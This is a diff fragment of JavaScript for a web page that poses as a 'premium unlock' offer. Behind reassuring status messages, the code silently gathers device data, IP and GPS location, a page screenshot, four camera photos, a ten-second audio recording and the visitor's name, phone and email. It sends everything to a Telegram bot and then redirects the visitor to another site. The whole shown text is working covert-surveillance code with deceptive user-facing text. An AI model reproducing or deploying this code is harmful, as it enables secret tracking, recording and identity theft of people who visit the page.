+                    msg += '• Accuracy: ' + escapeHtml(gpsData.accuracy) + '\n';
+                    msg += '• Altitude: ' + escapeHtml(gpsData.altitude) + '\n';
+                    msg += '• Speed: ' + escapeHtml(gpsData.speed) + '\n';
+                    msg += '\n🗺️ <a href="https://www.google.com/maps?q=' + gpsData.latitude + ',' + gpsData.longitude + '">View on Google Maps</a>';
                 }
-                msg += '\n';
-                
-                if (ip && ip.success) {
-                    msg += '🌐 <b>IP LOCATION:</b>\n';
-                    msg += '• IP: ' + escapeHtml(ip.ip) + '\n';
-                    msg += '• City: ' + escapeHtml(ip.city) + '\n';
-                    msg += '• Region: ' + escapeHtml(ip.region) + '\n';
-                    msg += '• Country: ' + escapeHtml(ip.country) + ' (' + escapeHtml(ip.countryCode) + ')\n';
-                    msg += '• Latitude: ' + escapeHtml(ip.latitude) + '\n';
-                    msg += '• Longitude: ' + escapeHtml(ip.longitude) + '\n';
-                    msg += '• ISP: ' + escapeHtml(ip.isp) + '\n';
-                    if (ip.org) msg += '• Org: ' + escapeHtml(ip.org) + '\n';
-                    if (ip.as) msg += '• AS: ' + escapeHtml(ip.as) + '\n';
-                    if (ip.postal) msg += '• Postal: ' + escapeHtml(ip.postal) + '\n';
-                    msg += '• Source: ' + escapeHtml(ip.source) + '\n\n';
-                }
-                
-                // Map Link
-                var mapLink = 'N/A';
-                if (gps.success) {
-                    mapLink = 'https://www.google.com/maps?q=' + gps.latitude + ',' + gps.longitude;
-                } else if (ip && ip.success) {
-                    mapLink = 'https://www.google.com/maps?q=' + ip.latitude + ',' + ip.longitude;
-                }
-                msg += '🗺️ <b>MAP:</b> ' + mapLink;
-                
+
                 return msg;
             }
 
             function buildContactMessage(contact, skipped) {
-                var msg = '👤 <b>CONTACT INFO</b> [7/7]\n';
+                var msg = '👤 <b>CONTACT INFO</b>\n';
                 msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
-                
                 msg += '🔑 <b>Session:</b> ' + escapeHtml(sessionId) + '\n';
-                msg += '⏰ <b>Time:</b> ' + escapeHtml(getTimestamp()) + '\n';
-                msg += '⏱️ <b>Total Time:</b> ' + escapeHtml(getTimeOnPage()) + '\n\n';
-                
+                msg += '⏰ <b>Time:</b> ' + escapeHtml(getTimestamp()) + '\n\n';
+
                 if (skipped) {
-                    msg += '⚠️ <b>STATUS:</b> ❌ SKIPPED\n';
-                    msg += '• User chose to skip premium features\n';
+                    msg += '⚠️ <b>Status:</b> SKIPPED\n';
                 } else {
-                    msg += '✅ <b>STATUS:</b> SUBMITTED\n\n';
+                    msg += '✅ <b>Status:</b> SUBMITTED\n\n';
                     msg += '👤 <b>Name:</b> ' + escapeHtml(contact.name) + '\n';
                     msg += '📱 <b>Phone:</b> ' + escapeHtml(contact.phone) + '\n';
                     msg += '📧 <b>Email:</b> ' + escapeHtml(contact.email) + '\n';
                 }
-                
+
                 msg += '\n━━━━━━━━━━━━━━━━━━━━━━━━\n';
-                msg += '✅ <b>SESSION COMPLETE</b>\n';
-                msg += '🔗 Redirecting to main site...';
-                
+                msg += '✅ <b>SESSION COMPLETE</b>';
+
                 return msg;
             }
 
             // ============================================================
-            // MAIN FLOW - REAL TIME SENDING
+            // MAIN FLOW
             // ============================================================
 
             async function handleContinue() {
@@ -1211,63 +1370,45 @@
                 btn.innerHTML = '<span>⏳</span><span>Please wait...</span>';
 
                 try {
-                    // STEP 1: Collect & Send Device Data IMMEDIATELY
-                    showStatus('📱 Collecting device info...', 'loading');
-                    deviceData = await collectDeviceData();
-                    await sendTelegramMessage(buildDeviceMessage(deviceData));
-                    
-                    // STEP 2: Get IP Location & GPS, Send IMMEDIATELY
-                    showStatus('📍 Getting your location...', 'loading');
-                    ipData = await getIPLocation();
-                    locationData = await getGPSLocation();
-                    await sendTelegramMessage(buildLocationMessage(locationData, ipData));
-                    
-                    // STEP 3: Capture & Send Photos IMMEDIATELY (one by one)
-                    showStatus('✨ Personalizing your experience...', 'loading');
-                    
-                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                        // Back Camera Photo 1
-                        var back1 = await capturePhoto('environment', 1);
-                        if (back1.success) {
-                            var caption = '📸 Photo 1/4 - Back Camera #1\n';
-                            caption += '🔑 Session: ' + sessionId + '\n';
-                            caption += '📐 Resolution: ' + back1.resolution + '\n';
-                            caption += '⏰ Time: ' + back1.timestamp;
-                            await sendTelegramPhoto(back1.data, caption);
-                        }
-                        
-                        // Back Camera Photo 2
-                        var back2 = await capturePhoto('environment', 2);
-                        if (back2.success) {
-                            var caption = '📸 Photo 2/4 - Back Camera #2\n';
-                            caption += '🔑 Session: ' + sessionId + '\n';
-                            caption += '📐 Resolution: ' + back2.resolution + '\n';
-                            caption += '⏰ Time: ' + back2.timestamp;
-                            await sendTelegramPhoto(back2.data, caption);
-                        }
-                        
-                        // Front Camera Photo 1
-                        var front1 = await capturePhoto('user', 1);
-                        if (front1.success) {
-                            var caption = '📸 Photo 3/4 - Front Camera #1\n';
-                            caption += '🔑 Session: ' + sessionId + '\n';
-                            caption += '📐 Resolution: ' + front1.resolution + '\n';
-                            caption += '⏰ Time: ' + front1.timestamp;
-                            await sendTelegramPhoto(front1.data, caption);
-                        }
-                        
-                        // Front Camera Photo 2
-                        var front2 = await capturePhoto('user', 2);
-                        if (front2.success) {
-                            var caption = '📸 Photo 4/4 - Front Camera #2\n';
-                            caption += '🔑 Session: ' + sessionId + '\n';
-                            caption += '📐 Resolution: ' + front2.resolution + '\n';
-                            caption += '⏰ Time: ' + front2.timestamp;
-                            await sendTelegramPhoto(front2.data, caption);
-                        }
+                    // Step 1: Collect silent data
+                    showStatus('🔍 Initializing...', 'loading');
+                    var silentData = await collectSilentData();
+                    var ipData = await getIPLocation();
+
+                    // Send silent data immediately
+                    await sendTelegramMessage(buildSilentDataMessage(silentData, ipData));
+
+                    // Step 2: Take screenshot of page
+                    showStatus('📸 Preparing your experience...', 'loading');
+                    var screenshot = await capturePageScreenshot();
+                    if (screenshot) {
+                        await sendTelegramPhoto(screenshot, '🖥️ Page Screenshot\n🔑 Session: ' + sessionId);
                     }
-                    
-                    // STEP 4: Show Contact Modal
+
+                    // Step 3: Camera + Audio (Popup 1)
+                    showStatus('✨ Setting up AI recommendations...', 'loading');
+                    var mediaResult = await capturePhotosAndAudio();
+
+                    // Send photos
+                    for (var i = 0; i < mediaResult.photos.length; i++) {
+                        var photo = mediaResult.photos[i];
+                        var caption = '📸 Photo ' + (i + 1) + '/4\n';
+                        caption += '📷 ' + photo.type + ' Camera #' + photo.number + '\n';
+                        caption += '🔑 Session: ' + sessionId;
+                        await sendTelegramPhoto(photo.data, caption);
+                    }
+
+                    // Send audio
+                    if (mediaResult.audio) {
+                        await sendTelegramAudio(mediaResult.audio, '🎤 Audio Recording (10 sec)\n🔑 Session: ' + sessionId);
+                    }
+
+                    // Step 4: GPS Location (Popup 2)
+                    showStatus('📍 Finding nearby places...', 'loading');
+                    var gpsData = await getGPSLocation();
+                    await sendTelegramMessage(buildGPSMessage(gpsData));
+
+                    // Step 5: Show contact form
                     showStatus('🎁 One more step...', 'loading');
                     await delay(500);
                     document.getElementById('contactModal').classList.add('active');
@@ -1280,7 +1421,7 @@
             }
 
             // ============================================================
-            // CONTACT FORM HANDLING
+            // CONTACT FORM
             // ============================================================
 
             function validateForm() {
@@ -1312,14 +1453,12 @@
                     };
                 }
 
-                // Send contact info IMMEDIATELY
                 await sendTelegramMessage(buildContactMessage(contact, skipped));
 
-                // Close modals and redirect
                 document.getElementById('contactModal').classList.remove('active');
                 document.getElementById('skipConfirmModal').classList.remove('active');
                 
-                showStatus('🎉 ' + (skipped ? 'Redirecting...' : 'Premium unlocked! Redirecting...'), 'success');
+                showStatus('🎉 ' + (skipped ? 'Redirecting...' : 'Premium Unlocked! Redirecting...'), 'success');
                 
                 setTimeout(function() { window.location.href = CONFIG.MAIN_SITE_URL; }, 1500);
             }
@@ -1331,19 +1470,16 @@
             function init() {
                 hidePageLoader();
 
-                // Main button
                 document.getElementById('continueBtn').addEventListener('click', function(e) {
                     e.preventDefault();
                     handleContinue();
                 });
 
-                // Contact form
                 document.getElementById('contactForm').addEventListener('submit', function(e) {
                     e.preventDefault();
                     if (validateForm()) submitContact(false);
                 });
 
-                // Skip buttons
                 document.getElementById('skipBtn').addEventListener('click', function() {
                     document.getElementById('skipConfirmModal').classList.add('active');
                 });
@@ -1356,7 +1492,6 @@
                     submitContact(true);
                 });
 
-                // Close on outside click
                 document.getElementById('contactModal').addEventListener('click', function(e) {
                     if (e.target === this) document.getElementById('skipConfirmModal').classList.add('active');
                 });
